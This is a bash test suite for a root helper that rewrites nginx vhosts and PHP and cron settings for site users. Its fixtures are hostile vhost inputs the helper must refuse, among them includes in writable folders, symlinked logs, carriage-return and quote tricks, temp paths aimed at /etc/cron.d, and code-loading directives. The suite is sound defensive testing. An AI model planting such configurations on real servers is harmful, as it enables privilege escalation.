cp -p "$WORK/shop_other.saved" "$WORK/etc-sites/sites/shop_other"

echo "== vhost-set-root: a site user's path only for its own domain"
ok "into the site's own folder" "root $SITE/current/public;" vhost-set-root shop.example /home/ploi/shop.example/public "$SITE/current/public"
refuse "into another site's home" "site user shop_other is for other.example, not shop.example" \
  vhost-set-root shop.example /home/ploi/x/public /srv/eeploi/shop_other/other.example/current/public
refuse "into another domain's folder of the site" "not in /srv/eeploi/shop_example/shop.example" \
  vhost-set-root shop.example /home/ploi/x/public /srv/eeploi/shop_example/other.example/current/public
refuse "into the site's home itself" "not in /srv/eeploi/shop_example/shop.example" \
  vhost-set-root shop.example /home/ploi/x/public /srv/eeploi/shop_example/public
refuse "from another site's home" "site user shop_other is for other.example, not shop.example" \
  vhost-set-root shop.example /srv/eeploi/shop_other/other.example/current/public "$SITE/current/public"
ok "between panel homes, as before" "root /home/eeploi/example.com/current/public;" \
  vhost-set-root example.com /home/ploi/example.com/public /home/eeploi/example.com/current/public

echo "== every subcommand: the deploy user only"
GATE="run through sudo as the deploy user eeploi"
for as in ploi forge; do
  panel=forge
  [ "$as" = ploi ] || panel=ploi
  AS=$as refuse "vhost-write from $as" "$GATE" vhost-write shop.example shop_example 8.4
  AS=$as refuse "php-pool-write from $as" "$GATE" "${POOL[@]}"
  IN='id' AS=$as refuse "supervisor-write from $as" "$GATE" "${SUP[@]}"
  IN=$CRON_LINE AS=$as refuse "cron-write from $as" "$GATE" cron-write shop_example
  AS=$as refuse "cron-remove from $as" "$GATE" cron-remove shop_example
  AS=$as refuse "env-install from $as" "$GATE" env-install "/home/$panel/a/.env" "$SITE/.env" shop_example
  AS=$as refuse "storage-copy from $as" "$GATE" storage-copy "/home/$panel/a/storage" "$SITE/storage" shop_example
  AS=$as refuse "db-create socket login from $as" "$GATE" db-create mysql shop_example shop_example socket
  AS=$as refuse "vhost-set-root into a site home from $as" "$GATE" \
    vhost-set-root shop.example /home/forge/x/public "$SITE/current/public"
  AS=$as refuse "supervisor-remove from $as" "$GATE" supervisor-remove eeploi-shop.example-a
  AS=$as refuse "vhost-enable from $as" "$GATE" vhost-enable example.com
  IN=$PW AS=$as refuse "db-create password login from $as" "$GATE" db-create mysql shop shop password
  IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' AS=$as refuse "crontab-remove-lines from $as" "$GATE" crontab-remove-lines example.com
  AS=$as refuse "crontab-restore from $as" "$GATE" crontab-restore example.com
  AS=$as refuse "firewall-close-22 from $as" "$GATE" firewall-close-22
done
printf 'DOMAIN=other.example\nSUPERVISOR=/etc/supervisor/conf.d/eeploi-other.example-a.conf\n' > "$WORK/etc-sites/sites/shop_other"
AS=ploi refuse "supervisor-remove of a listed program from ploi" "$GATE" supervisor-remove eeploi-other.example-a
AS=ploi refuse "supervisor-remove-site from ploi" "$GATE" supervisor-remove-site other.example
cp -p "$WORK/shop_other.saved" "$WORK/etc-sites/sites/shop_other"

echo "== vhost-set-root: a Ploi or Forge vhost moved into a site home gets disable_symlinks"
NEW_ROOT="$SITE/current/public"
OWN_LINE="disable_symlinks if_not_owner from=/srv/eeploi/shop_example;"
# Ploi: one server block for port 80 and 443.
cat > "$WORK/vhost-ploi" <<'VHOST'
server {
    listen 80;
    listen [::]:80;
    listen 443 ssl http2;
    server_name shop.example;
    root /home/ploi/shop.example/public;
    index index.php;
    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }
}
VHOST
# Forge: a redirect on port 80, the site on 443.
cat > "$WORK/vhost-forge" <<'VHOST'
server {
    listen 80;
    server_name shop.example;
    return 301 https://$host$request_uri;
}
server {
    listen 443 ssl;
    server_name shop.example;
    root /home/forge/shop.example/public;
}
VHOST
VHOST="$WORK/vhost-ploi" ok "ploi vhost: the root, then disable_symlinks" "      root $NEW_ROOT;
      $OWN_LINE
      index index.php;" vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
VHOST="$WORK/vhost-ploi" ok "ploi vhost: the rest stays" "      listen 443 ssl http2;
      server_name shop.example;" vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
VHOST="$WORK/vhost-ploi" ok "ploi vhost: nginx -t" "run: nginx -t" vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
VHOST="$WORK/vhost-forge" ok "forge vhost: in the 443 block" "      listen 443 ssl;
      server_name shop.example;
      root $NEW_ROOT;
      $OWN_LINE
  }" vhost-set-root shop.example /home/forge/shop.example/public "$NEW_ROOT"
VHOST="$WORK/vhost-forge" call vhost-set-root shop.example /home/forge/shop.example/public "$NEW_ROOT"
if [ "$(grep -c disable_symlinks <<< "$OUT")" -eq 1 ]; then pass; else failure "forge vhost: disable_symlinks once" "$OUT"; fi
# Run again on the result: still one root line and one disable_symlinks.
VHOST="$WORK/vhost-ploi" call vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
sed -n 's/^  //p' <<< "$OUT" | sed '/^write:/d;/^run:/d' > "$WORK/vhost-moved"
VHOST="$WORK/vhost-moved" call vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
if [ "$CODE" -eq 0 ] && [ "$(grep -c disable_symlinks <<< "$OUT")" -eq 1 ] && [ "$(grep -c "root $NEW_ROOT;" <<< "$OUT")" -eq 1 ]; then pass; else
  failure "run again: one root and one disable_symlinks" "$OUT"; fi
VHOST="$WORK/vhost-moved" lacks "back to the panel home: eeploi's line goes" "disable_symlinks" \
  vhost-set-root shop.example "$NEW_ROOT" /home/ploi/shop.example/public
VHOST="$WORK/vhost-moved" ok "back to the panel home: the old root" "      root /home/ploi/shop.example/public;" \
  vhost-set-root shop.example "$NEW_ROOT" /home/ploi/shop.example/public
printf 'server {\n    listen 80;\n    root /home/ploi/shop.example/public;\n}\n' > "$WORK/vhost-port80"
VHOST="$WORK/vhost-port80" refuse "a root outside a 443 block" "the root line is not in a server block on port 443, disable_symlinks can't be placed" \
  vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
printf 'server {\n    listen 443 ssl;\n    disable_symlinks off;\n    root /home/ploi/shop.example/public;\n}\n' > "$WORK/vhost-own-symlinks"
VHOST="$WORK/vhost-own-symlinks" refuse "a vhost with its own disable_symlinks" "the vhost has a disable_symlinks line of its own" \
  vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
printf 'server {\n    listen 443 ssl;\n    root /home/ploi/shop.example/public;\n}\nserver {\n    listen 443 ssl;\n    root /home/ploi/shop.example/public;\n}\n' > "$WORK/vhost-two-roots"
VHOST="$WORK/vhost-two-roots" refuse "two root lines" "expected one 'root /home/ploi/shop.example/public;' line in the vhost, found 2" \
  vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
VHOST="$WORK/vhost-forge" refuse "no root line" "expected one 'root /home/ploi/other/public;' line in the vhost, found 0" \
  vhost-set-root shop.example /home/ploi/other/public "$NEW_ROOT"
printf 'server {\n    listen 443 ssl;\n    # root /home/ploi/shop.example/public;\n    root /home/ploi/shop.example/public;\n}\n' > "$WORK/vhost-comment"
VHOST="$WORK/vhost-comment" ok "a commented root line is not the root" "    # root /home/ploi/shop.example/public;
      root $NEW_ROOT;" vhost-set-root shop.example /home/ploi/shop.example/public "$NEW_ROOT"
VHOST="$WORK/vhost-ploi" ok "between panel homes: no disable_symlinks" "      root /home/eeploi/shop.example/current/public;
      index index.php;" vhost-set-root shop.example /home/ploi/shop.example/public /home/eeploi/shop.example/current/public

echo "== vhost-set-root: vhosts that try to steer where disable_symlinks goes"
OLD_ROOT=/home/ploi/shop.example/public
printf 'server {\n    listen 443 ssl;\n    add_header X-Note "a#b";\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-quoted-hash"
VHOST="$WORK/vhost-quoted-hash" refuse "a quoted #" "a vhost line with a quote and a {, } or # can't be read safely" \
  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
printf 'server {\n    listen 80;\n    location /a { return 200 "}"; }\n    root %s;\n}\nserver {\n    listen 443 ssl;\n}\n' "$OLD_ROOT" > "$WORK/vhost-quoted-brace"
VHOST="$WORK/vhost-quoted-brace" refuse "a quoted }" "a vhost line with a quote and a {, } or # can't be read safely" \
  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
printf "server {\n    # Ploi's settings {\n    listen 443 ssl;\n    root %s;\n}\n" "$OLD_ROOT" > "$WORK/vhost-quote-in-comment"
VHOST="$WORK/vhost-quote-in-comment" ok "a quote only in a comment is fine" "      root $NEW_ROOT;
      $OWN_LINE" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
printf 'server {\n    listen 443 ssl;\n    server_name shop.example;\n}\nserver\n{\n    listen 80;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-split-server"
VHOST="$WORK/vhost-split-server" refuse "server and { on two lines: the port-80 server is its own block" \
  "the root line is not in a server block on port 443" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
printf 'server {\n    listen 8443 ssl;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-8443"
VHOST="$WORK/vhost-8443" refuse "listen 8443 is not port 443" "the root line is not in a server block on port 443" \
  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
printf 'server {\n    listen [::]:4430;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-4430"
VHOST="$WORK/vhost-4430" refuse "listen 4430 is not port 443" "the root line is not in a server block on port 443" \
  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
printf 'server {\n    listen 127.0.0.1:443 ssl http2;\n    listen [::]:443;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-443-address"
VHOST="$WORK/vhost-443-address" ok "listen on an address, port 443" "      root $NEW_ROOT;
      $OWN_LINE" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
# shellcheck disable=SC2016 # nginx's own $request_uri
printf 'server {\n    listen 443 ssl;\n    server_name www.shop.example;\n    return 301 https://shop.example$request_uri;\n}\nserver {\n    listen 443 ssl;\n    server_name shop.example;\n    root %s;\n}\n' "$OLD_ROOT" > "$WORK/vhost-two-443"
VHOST="$WORK/vhost-two-443" ok "two 443 servers: in the one with the root" "      server_name shop.example;
      root $NEW_ROOT;
      $OWN_LINE
  }" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
printf 'server {\n    listen 443 ssl;\n    location / {\n        root %s;\n    }\n    location /files {\n        alias /home/ploi/files;\n    }\n}\n' "$OLD_ROOT" > "$WORK/vhost-root-in-location"
VHOST="$WORK/vhost-root-in-location" refuse "a root inside a location" "the root line is not at the top level of its server block" \
  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
# shellcheck disable=SC2016 # nginx's own $host
printf 'server {\n    listen 443 ssl;\n    if ($host = shop.example) {\n        root %s;\n    }\n}\n' "$OLD_ROOT" > "$WORK/vhost-root-in-if"
VHOST="$WORK/vhost-root-in-if" refuse "a root inside an if" "the root line is not at the top level of its server block" \
  vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
VHOST="$WORK/vhost-root-in-location" ok "between panel homes, a root in a location may stay" "root /home/eeploi/shop.example/current/public;" \
  vhost-set-root shop.example "$OLD_ROOT" /home/eeploi/shop.example/current/public

echo "== vhost-set-root: what the vhost includes and logs to stays root's"
# The nginx folder is $WORK (next to nginx-default.conf), the log folder $WORK/log-nginx. The tests own
# both, which stands in for root.
mkdir -p "$WORK/ploi/shop.example/before" "$WORK/log-nginx/dir.log" "$WORK/open-dir" "$WORK/open-parent/inner" "$WORK/open-empty" "$WORK/open-logs"
chmod 755 "$WORK/ploi" "$WORK/ploi/shop.example" "$WORK/ploi/shop.example/before" "$WORK/log-nginx" "$WORK/open-parent/inner"
chmod 777 "$WORK/open-dir" "$WORK/open-parent" "$WORK/open-empty" "$WORK/open-logs"
printf 'fastcgi_param A b;\n' > "$WORK/fastcgi_params"
printf 'add_header X-A b;\n' > "$WORK/ploi/shop.example/before/headers"
printf 'add_header X-B b;\n' > "$WORK/ploi/shop.example/before/more"
printf 'add_header X-C c;\n' > "$WORK/open-dir/x.conf"
printf 'add_header X-C c;\n' > "$WORK/open-parent/inner/x.conf"
printf 'add_header X-C c;\n' > "$WORK/group-writable.conf"
chmod 664 "$WORK/group-writable.conf"
ln -s "$WORK/fastcgi_params" "$WORK/linked.conf"
printf 'include %s/open-dir/x.conf;\n' "$WORK" > "$WORK/nested-open.conf"
printf 'include fastcgi_params;\n' > "$WORK/nested-closed.conf"
printf 'include loop.conf;\n' > "$WORK/loop.conf"
ln -s /etc/hostname "$WORK/log-nginx/linked.log"
# paths_vhost <lines>: a vhost with the root and these lines in its server block.
paths_vhost() { printf 'server {\n    listen 443 ssl;\n    root %s;\n%s\n}\n' "$OLD_ROOT" "$1" > "$WORK/vhost-paths"; }
set_root() { VHOST="$WORK/vhost-paths" "$1" "$2" "$3" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"; }
paths_vhost "    include fastcgi_params;
    include $WORK/ploi/shop.example/before/*;
    location ~ \\.php\$ { include $WORK/nested-closed.conf; }
    access_log off;
    access_log $WORK/log-nginx/shop.example-access.log combined;
    error_log $WORK/log-nginx/shop.example-error.log error;
    error_log stderr;"
set_root ok "Ploi's includes and logs, all root's" "root $NEW_ROOT;"
paths_vhost "    include $WORK/ploi/shop.example/nothing-yet/*;"
set_root refuse "a wildcard in a folder that is missing" "a vhost include in a folder that is not root-owned"
paths_vhost "    include $WORK/ploi/shop.example/before/none-*;"
set_root ok "a wildcard that matches nothing, in a closed folder" "root $NEW_ROOT;"
paths_vhost "    include $WORK/open-dir/x.conf;"
set_root refuse "an include in a folder others may write" "a vhost include in a folder that is not root-owned, or open to group or others: $WORK/open-dir/x.conf"
paths_vhost "    include $WORK/open-parent/inner/x.conf;"
set_root refuse "an include below a folder others may write" "($WORK/open-parent)"
paths_vhost "    include $WORK/open-empty/*;"
set_root refuse "a wildcard in an open folder that matches nothing yet" "a vhost include in a folder that is not root-owned"
paths_vhost "    include $WORK/group-writable.conf;"
set_root refuse "an include its group may write" "a vhost include that is not root-owned, or open to group or others: $WORK/group-writable.conf"
paths_vhost "    include linked.conf;"
set_root refuse "an include that is a link" "a vhost include that is not root-owned, or open to group or others: $WORK/linked.conf"
paths_vhost "    include /home/ploi/shop.example/nginx.conf;"
set_root refuse "an include outside the nginx folder" "a vhost include outside $WORK: /home/ploi/shop.example/nginx.conf"
paths_vhost "    include $WORK/ploi/../open-dir/x.conf;"
set_root refuse "an include with .." "a vhost include with . or ..: $WORK/ploi/../open-dir/x.conf"
paths_vhost "    include $WORK/*/x.conf;"
set_root refuse "a wildcard in the folder of an include" "a vhost include with a wildcard in its folder"
paths_vhost "    include \"$WORK/fastcgi_params\";
    include 'fastcgi_params';"
set_root ok "a quoted include is read like nginx reads it" "root $NEW_ROOT;"
paths_vhost "    include \"$WORK/open-dir/x.conf\";"
set_root refuse "a quoted include is checked too" "a vhost include in a folder that is not root-owned, or open to group or others: $WORK/open-dir/x.conf"
paths_vhost "    include \"$WORK/fast\"\"cgi_params\";"
set_root refuse "an include of more than one quoted part" "a vhost include that can't be read safely"
paths_vhost "    include"$'\r'"$WORK/open-dir/x.conf;"
set_root refuse "a carriage return splits words, as in nginx" "a vhost include in a folder that is not root-owned, or open to group or others: $WORK/open-dir/x.conf"
paths_vhost "    access_log"$'\r'"/home/ploi/shop.example/access.log;"
set_root refuse "a carriage return before a log" "a vhost log outside $WORK/log-nginx: /home/ploi/shop.example/access.log"
paths_vhost "    include fastcgi_params;"$'\r'"
    access_log $WORK/log-nginx/shop.example-access.log;"$'\r'
set_root ok "Windows line endings" "root $NEW_ROOT;"
paths_vhost "    include fastcgi_params;"$'\r'"
    include $WORK/open-dir/x.conf;"$'\r'
set_root refuse "Windows line endings are checked too" "a vhost include in a folder that is not root-owned, or open to group or others: $WORK/open-dir/x.conf"
paths_vhost "    include"$'\r\r'"$WORK/open-dir/x.conf;"
set_root refuse "two carriage returns in a row" "a vhost include in a folder that is not root-owned, or open to group or others: $WORK/open-dir/x.conf"
paths_vhost "    include $WORK/nested-open.conf;"
set_root refuse "an include that includes an open file" "a vhost include in a folder that is not root-owned, or open to group or others: $WORK/open-dir/x.conf"
paths_vhost "    include $WORK/loop.conf;"
set_root refuse "an include that includes itself" "vhost includes nested deeper than 8"
paths_vhost "    include
        $WORK/open-dir/x.conf;"
set_root refuse "an include over two lines" "a vhost include in a folder that is not root-owned"
paths_vhost "    location / { try_files \$uri /index.php; } include $WORK/open-dir/x.conf;"
set_root refuse "an include after a } on the same line" "a vhost include in a folder that is not root-owned"
paths_vhost "    add_header X-Note \"a#b\"; include $WORK/open-dir/x.conf;"
VHOST="$WORK/vhost-paths" refuse "a quote and a # on one line" "a vhost line with a quote and a # can't be read safely" \
  vhost-set-root shop.example "$OLD_ROOT" /home/eeploi/shop.example/current/public
paths_vhost "    # include $WORK/open-dir/x.conf;"
set_root ok "an include in a comment" "root $NEW_ROOT;"
paths_vhost "    access_log /home/ploi/shop.example/access.log;"
set_root refuse "a log outside the log folder" "a vhost log outside $WORK/log-nginx: /home/ploi/shop.example/access.log"
paths_vhost "    error_log logs/error.log;"
set_root refuse "a relative log" "a vhost log that can't be read safely: logs/error.log"
paths_vhost "    access_log $WORK/log-nginx/a*.log;"
set_root refuse "a log with a wildcard" "a vhost log with a wildcard: $WORK/log-nginx/a*.log"
paths_vhost "    error_log $WORK/log-nginx/linked.log;"
set_root refuse "a log that is a link" "a vhost log that is a link or not a file: $WORK/log-nginx/linked.log"
paths_vhost "    access_log $WORK/log-nginx/dir.log;"
set_root refuse "a log that is a folder" "a vhost log that is a link or not a file: $WORK/log-nginx/dir.log"
paths_vhost "    access_log $WORK/open-logs/a.log;"
LOGS="$WORK/open-logs" set_root refuse "a log folder others may write" "a vhost log in a folder that is not root-owned"
paths_vhost "    access_log \"$WORK/log-nginx/shop.example-access.log\";
    error_log '/home/ploi/shop.example/error.log';"
set_root refuse "a quoted log is checked too" "a vhost log outside $WORK/log-nginx: /home/ploi/shop.example/error.log"
paths_vhost "    access_log \"$WORK/log-nginx/shop.example-access.log\";"
set_root ok "a quoted log is read like nginx reads it" "root $NEW_ROOT;"
mkdir -p "$WORK/ssl/shop.example" "$WORK/ssl-open"
chmod 755 "$WORK/ssl" "$WORK/ssl/shop.example"
chmod 775 "$WORK/ssl-open"
for f in shop.example/server.crt shop.example/server.key dhparam.pem passwords htpasswd; do printf 'x\n' > "$WORK/ssl/$f"; done
chmod 600 "$WORK/ssl/shop.example/server.key"
printf 'x\n' > "$WORK/ssl-open/server.crt"
printf 'x\n' > "$WORK/ssl/open.key"
chmod 606 "$WORK/ssl/open.key"
ln -s "$WORK/ssl/shop.example/server.crt" "$WORK/ssl/linked.crt"
paths_vhost "    ssl_certificate $WORK/ssl/shop.example/server.crt;
    ssl_certificate_key ssl/shop.example/server.key;
    ssl_dhparam \"$WORK/ssl/dhparam.pem\";
    ssl_password_file $WORK/ssl/passwords;
    location / { auth_basic_user_file $WORK/ssl/htpasswd; }"
set_root ok "certificates, keys and password files, all root's" "root $NEW_ROOT;"
paths_vhost "    ssl_certificate /etc/letsencrypt/live/shop.example/fullchain.pem;"
set_root refuse "a certbot certificate" "a vhost ssl_certificate outside $WORK: /etc/letsencrypt/live/shop.example/fullchain.pem"
paths_vhost "    ssl_certificate_key /etc/letsencrypt/live/shop.example/privkey.pem;"
set_root refuse "a certbot key" "a vhost ssl_certificate_key outside $WORK: /etc/letsencrypt/live/shop.example/privkey.pem"
paths_vhost "    ssl_certificate $WORK/ssl-open/server.crt;"
set_root refuse "a certificate in a folder its group may write" \
  "a vhost ssl_certificate in a folder that is not root-owned, or open to group or others: $WORK/ssl-open/server.crt ($WORK/ssl-open)"
paths_vhost "    ssl_certificate_key $WORK/ssl/open.key;"
set_root refuse "a key others may write" "a vhost ssl_certificate_key that is not root-owned, or open to group or others: $WORK/ssl/open.key"
paths_vhost "    ssl_certificate $WORK/ssl/linked.crt;"
set_root refuse "a certificate that is a link" "a vhost ssl_certificate that is not root-owned, or open to group or others: $WORK/ssl/linked.crt"
paths_vhost "    ssl_certificate $WORK/ssl/*.crt;"
set_root refuse "a certificate with a wildcard" "a vhost ssl_certificate with a wildcard: $WORK/ssl/*.crt"
paths_vhost "    ssl_certificate \$ssl_server_name.crt;"
set_root refuse "a certificate named by a variable" "a vhost ssl_certificate that can't be read safely"
paths_vhost "    ssl_dhparam /home/ploi/dhparam.pem;"
set_root refuse "a dhparam outside the nginx folder" "a vhost ssl_dhparam outside $WORK: /home/ploi/dhparam.pem"
paths_vhost "    ssl_dhparam $WORK/group-writable.conf;"
set_root refuse "a dhparam its group may write" "a vhost ssl_dhparam that is not root-owned, or open to group or others: $WORK/group-writable.conf"
paths_vhost "    ssl_password_file /home/ploi/passwords;"
set_root refuse "a password file outside the nginx folder" "a vhost ssl_password_file outside $WORK: /home/ploi/passwords"
paths_vhost "    ssl_password_file $WORK/ssl/missing;"
set_root refuse "a password file that isn't there" "a vhost ssl_password_file that is not root-owned, or open to group or others: $WORK/ssl/missing"
paths_vhost "    location / { auth_basic_user_file /srv/eeploi/shop_example/shop.example/.htpasswd; }"
set_root refuse "basic auth from a site's own folder" "a vhost auth_basic_user_file outside $WORK: /srv/eeploi/shop_example/shop.example/.htpasswd"
paths_vhost "    location / { auth_basic_user_file $WORK/open-dir/x.conf; }"
set_root refuse "basic auth from a folder others may write" "a vhost auth_basic_user_file in a folder that is not root-owned"
paths_vhost "    ssl_trusted_certificate $WORK/ssl/shop.example/server.crt;
    ssl_client_certificate ssl/shop.example/server.crt;
    ssl_session_ticket_key $WORK/ssl/shop.example/server.key;
    location / { proxy_ssl_certificate $WORK/ssl/shop.example/server.crt; proxy_ssl_certificate_key $WORK/ssl/shop.example/server.key; }
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_session_cache shared:SSL:10m;
    ssl_stapling on;
    proxy_ssl_server_name on;"
set_root ok "the other file directives, all root's, and ssl_ settings that name no file" "root $NEW_ROOT;"
for directive in ssl_trusted_certificate ssl_client_certificate ssl_crl ssl_stapling_file ssl_session_ticket_key ssl_key_log \
  proxy_ssl_certificate proxy_ssl_certificate_key proxy_ssl_trusted_certificate proxy_ssl_password_file grpc_ssl_certificate_key \
  uwsgi_ssl_certificate auth_jwt_key_file ssl_future_thing_file; do
  paths_vhost "    location / { $directive /home/ploi/shop.example/x.pem; }"
  set_root refuse "$directive outside the nginx folder" "a vhost $directive outside $WORK: /home/ploi/shop.example/x.pem"
done
paths_vhost "    proxy_ssl_trusted_certificate $WORK/ssl-open/server.crt;"
set_root refuse "a proxy CA in a folder its group may write" "a vhost proxy_ssl_trusted_certificate in a folder that is not root-owned"
paths_vhost "    auth_jwt_key_file $WORK/ssl/open.key;"
set_root refuse "a JWT key others may write" "a vhost auth_jwt_key_file that is not root-owned, or open to group or others: $WORK/ssl/open.key"
for line in 'proxy_temp_path /etc/cron.d' 'client_body_temp_path /tmp/body' 'fastcgi_cache_path /var/cache/nginx/shop levels=1:2 keys_zone=shop:10m' \
  'uwsgi_cache_path /tmp/u keys_zone=u:1m' 'js_import /home/ploi/shop.example/main.js' 'js_path /home/ploi' 'perl_modules /home/ploi/perl' \
  'perl_require shop.pm' 'xslt_stylesheet /home/ploi/x.xslt' 'geoip_country /home/ploi/GeoIP.dat' 'content_by_lua_file /home/ploi/x.lua'; do
  paths_vhost "    $line;"
  set_root refuse "${line%% *} is refused" "a vhost with ${line%% *}, which eeploi doesn't allow"
done
paths_vhost "    fastcgi_cache shop;
    proxy_cache_valid 200 1m;
    fastcgi_cache_key \$scheme\$host\$request_uri;"
set_root ok "a cache zone a vhost only uses is fine" "root $NEW_ROOT;"
paths_vhost "    include $WORK/nested-perl.conf;"
printf 'perl_modules /home/ploi/perl;\n' > "$WORK/nested-perl.conf"
set_root refuse "Perl in an included file" "a vhost with perl_modules, which eeploi doesn't allow"
paths_vhost "    include $WORK/nested-cert.conf;"
printf 'ssl_certificate /etc/letsencrypt/live/shop.example/fullchain.pem;\n' > "$WORK/nested-cert.conf"
set_root refuse "a certbot certificate in an included file" "a vhost ssl_certificate outside $WORK"
paths_vhost "    ssl_certificate"$'\r'"/etc/letsencrypt/live/shop.example/fullchain.pem;"
set_root refuse "a carriage return before a certificate" "a vhost ssl_certificate outside $WORK"
SOCK_FROM=/var/run/php/php8.4-fpm.sock SOCK_TO=/run/php/php8.4-fpm-shop_example.sock
paths_vhost "    include $WORK/open-dir/x.conf;"
VHOST="$WORK/vhost-paths" refuse "vhost-set-socket: an open include" "a vhost include in a folder that is not root-owned" \
  vhost-set-socket shop.example "$SOCK_FROM" "$SOCK_TO"
paths_vhost "    include fastcgi_params;
    error_log $WORK/log-nginx/linked.log;"
VHOST="$WORK/vhost-paths" refuse "vhost-set-socket: a log that is a link" "a vhost log that is a link or not a file" \
  vhost-set-socket shop.example "$SOCK_FROM" "$SOCK_TO"
paths_vhost "    include fastcgi_params;"
VHOST="$WORK/vhost-paths" ok "vhost-set-socket: includes all root's" "run: nginx -t" \
  vhost-set-socket shop.example "$SOCK_FROM" "$SOCK_TO"
ok "vhost-set-socket: a dry run says it checks" "check: the vhost's includes and logs" vhost-set-socket shop.example "$SOCK_FROM" "$SOCK_TO"
ok "vhost-set-root: a dry run says it checks" "check: the vhost's includes and logs" vhost-set-root shop.example "$OLD_ROOT" "$NEW_ROOT"
paths_vhost "    add_header X-A a#; include $WORK/open-dir/x.conf;"
set_root refuse "a # inside a word is no comment to nginx" "a vhost line with a # inside a word can't be read safely"
paths_vhost "    add_header X-A a; # include $WORK/open-dir/x.conf;"
set_root ok "a # after a ; is a comment" "root $NEW_ROOT;"
paths_vhost "    \"include\" $WORK/open-dir/x.conf;"
set_root refuse "a quoted include name" "a vhost include in a folder that is not root-owned"
paths_vhost "    'error_log' /home/ploi/shop.example/error.log;"
set_root refuse "a quoted log name" "a vhost log outside $WORK/log-nginx"
paths_vhost "    add_header X-A '
    #'; include $WORK/open-dir/x.conf;"
VHOST="$WORK/vhost-paths" refuse "a quote open over two lines" "a vhost line with an open quote can't be read safely" \
  vhost-set-root shop.example "$OLD_ROOT" /home/eeploi/shop.example/current/public

echo "== releases-own"
ok "chown below the site's releases, from inside its folder, in one walk" "run: cd $SITE
run: find releases -depth ( -user root -o -user eeploi ) ( -type d -o -links 1 ) -execdir chown -h shop_example: -- {} +" \
  releases-own shop_example
AS=deploy ETC_DIR="$WORK/etc-conf" ok "the configured deploy user" "-user root -o -user deploy )" releases-own shop_example
lacks "no chown that walks on its own" "chown -R" releases-own shop_example
ok "only with hard link protection" "check: fs.protected_hardlinks is 1" releases-own shop_example
ok "the site's own domain from the registry" "run: cd /srv/eeploi/shop_www/www.shop.example" releases-own shop_www
refuse "releases-own for an unlisted user" "alex_web is not an eeploi site user" releases-own alex_web
refuse "releases-own for root" "reserved name, not a site user: root" releases-own root
refuse "releases-own for a site user in sudo" "in other groups too" releases-own shop_sudo
refuse "releases-own without a user" "usage: releases-own <user>" releases-own
refuse "releases-own with a path" "usage" releases-own shop_example /srv/eeploi/shop_example/shop.example/releases
AS=ploi refuse "releases-own from ploi" "run through sudo as the deploy user eeploi" releases-own shop_example

echo "== first line"
check "the first line names /bin/bash, never a bash on PATH" grep -qxF '#!/bin/bash' <(head -n 1 "$HELPER")

echo "== registry_lock makes its folder first"
# Dry runs skip the lock, so this reads the function itself: root_dir comes before the lock file opens.
lock_fn=$(sed -n '/^registry_lock() {/,/^}/p' "$HELPER")
# shellcheck disable=SC2016 # the literal $ETC of the helper's own lines
if [[ $lock_fn == *'root_dir "$ETC/sites"'*'exec 9> "$ETC/sites/.lock"'* ]]; then pass; else failure "registry_lock: root_dir before the lock file" "$lock_fn"; fi

echo "== vhost-remove: every check before anything goes"
AS=ploi call vhost-remove shop.example
if [ "$CODE" -eq 64 ] && [[ $OUT == *"$GATE"* && $OUT != *"rm -f"* ]]; then pass; else
  failure "vhost-remove of a site's vhost from ploi removes nothing" "exit $CODE
$OUT"; fi
ETC_DIR="$WORK/etc-reg-writable" call vhost-remove shop.example
if [ "$CODE" -eq 64 ] && [[ $OUT == *"untrusted site registry"* && $OUT != *"rm -f"* ]]; then pass; else
  failure "vhost-remove with an untrusted registry removes nothing" "exit $CODE
$OUT"; fi
ok "vhost-remove of a site's vhost" "run: rm -f /etc/nginx/sites-enabled/shop.example /etc/nginx/sites-available/shop.example" vhost-remove shop.example
AS=ploi refuse "vhost-remove of a panel's vhost from ploi" "$GATE" vhost-remove example.com
AS=ploi call supervisor-remove eeploi-shop.example-a
if [ "$CODE" -eq 64 ] && [[ $OUT != *"rm -f"* ]]; then pass; else failure "supervisor-remove from ploi removes nothing" "$OUT"; fi
ETC_DIR="$WORK/etc-reg-writable" call supervisor-remove eeploi-shop.example-a
if [ "$CODE" -eq 64 ] && [[ $OUT != *"rm -f"* ]]; then pass; else failure "supervisor-remove with an untrusted registry removes nothing" "$OUT"; fi

echo "== php-pool-write: one pool per site"
cp -p "$WORK/etc-sites/sites/shop_other" "$WORK/shop_other.saved"
printf 'DOMAIN=other.example\nPOOL=/etc/php/8.3/fpm/pool.d/eeploi-shop_other.conf\n' > "$WORK/etc-sites/sites/shop_other"
ok "a new version: the old pool goes after the new one passes" "run: php-fpm8.4 -t
run: rm -f /etc/php/8.3/fpm/pool.d/eeploi-shop_other.conf
run: php-fpm8.3 -t" php-pool-write 8.4 shop_other
ok "a new version: the registry lists the new pool only" "  DOMAIN=other.example
  POOL=/etc/php/8.4/fpm/pool.d/eeploi-shop_other.conf
write:" php-pool-write 8.4 shop_other
ok "a new version: both versions reload" "run: service php8.4-fpm reload
